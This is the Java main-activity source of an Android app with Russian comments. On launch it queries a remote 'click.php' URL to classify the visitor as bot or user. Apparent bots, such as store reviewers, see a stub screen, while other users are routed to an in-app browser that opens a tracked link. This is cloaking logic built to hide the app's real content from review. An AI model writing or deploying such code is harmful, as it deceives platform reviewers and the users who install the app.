package com.lessvoterfraudclaims.delightfulemeraldmichele;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.UnknownHostException;
import java.security.MessageDigest;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    public static final boolean debug = true;
    public final String TAG = this.getClass().getSimpleName();
    public static final String url_check    //  Проверка типа пользователя
            = "https://lessvoterfraudclaims.com/click.php?key=ca1po7lrbg25uzmg1ym1";
    public static String url_user           //  Направление для User
            = "https://lessvoterfraudclaims.com/click.php?key=2d26h7liiqkfh3yf21i5&ad_name={{ad_name}}";
    public static final String bot_str = "Paris", user_str = "Marsel";

    @Override
    protected void onResume() {
        super.onResume();
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
    }

    private void printKeyHash() {
        // Add code to print out the key hash
        try {
            PackageInfo info = getPackageManager().getPackageInfo(
                    "com.lessvoterfraudclaims.delightfulemeraldmichele",
                    PackageManager.GET_SIGNATURES);
            for (Signature signature : info.signatures) {
                MessageDigest md = MessageDigest.getInstance("SHA");
                md.update(signature.toByteArray());
                Log.e("KeyHash:", Base64.encodeToString(md.digest(), Base64.DEFAULT));
            }
        } catch (Exception e) {
            Log.e("KeyHash:", e.toString());
        }
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        printKeyHash();

        Uri data = this.getIntent().getData();
        if (data != null && data.isHierarchical()) {
            String uri = this.getIntent().getDataString();
            Log.e("----------------", "Deep link clicked " + uri);
        }
        try {
            startActivity(new Intent(this,
                    new AST().execute(url_check).get()
                            ? Zaglush.class
                            : Browser.class));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
/*
    private void printKeyHash() {
        try {
            @SuppressLint("PackageManagerGetSignatures")
            PackageInfo info = getPackageManager().getPackageInfo(
                    "com.lessvoterfraudclaims.delightfulemeraldmichele",
                    PackageManager.GET_SIGNATURES);
            Signature[] signatures = info.signatures;
            for (Signature sign : signatures) {
                MessageDigest md = MessageDigest.getInstance("SHA");
                md.update(sign.toByteArray());
                Log.d(TAG, "KeyHash: " + Base64.encodeToString(md.digest(), Base64.DEFAULT));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
*/
}

class AST extends AsyncTask<String, Void, Boolean> {

    @Override
    protected Boolean doInBackground(String[] in) {
        final String is_bot_tag = "is-bot";
        try {
            Log.e(is_bot_tag, "start");
            boolean is_bot = new BufferedReader(new InputStreamReader(new URL(in[0]).openStream()))
                    .readLine().contains(MainActivity.bot_str);
            Log.e(is_bot_tag, "" + is_bot);
            return is_bot;
        } catch (UnknownHostException un) {
            Log.e(is_bot_tag, "error-" + un);
        } catch (Exception e) {
            Log.e(is_bot_tag, "error-" + e);
            e.printStackTrace();
        }
        return true;
    }

}
